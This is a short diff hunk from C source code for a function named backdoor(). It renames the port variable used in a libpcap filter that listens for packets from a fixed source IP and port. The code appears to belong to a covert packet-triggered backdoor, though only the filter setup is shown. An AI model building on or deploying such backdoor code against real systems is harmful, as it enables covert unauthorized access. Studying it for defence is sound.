@@ -57,7 +57,7 @@ void backdoor()
     }
     
     // Create and parse the filter to the capture
-    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", SOURCE_IP, SOURCE_PORT);
+    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", SOURCE_IP, SOURCE_PORT_STRING);
     if (pcap_compile(handle, &fp, filter, 0, net) == -1)
     {
         systemFatal("Unable to compile filter");
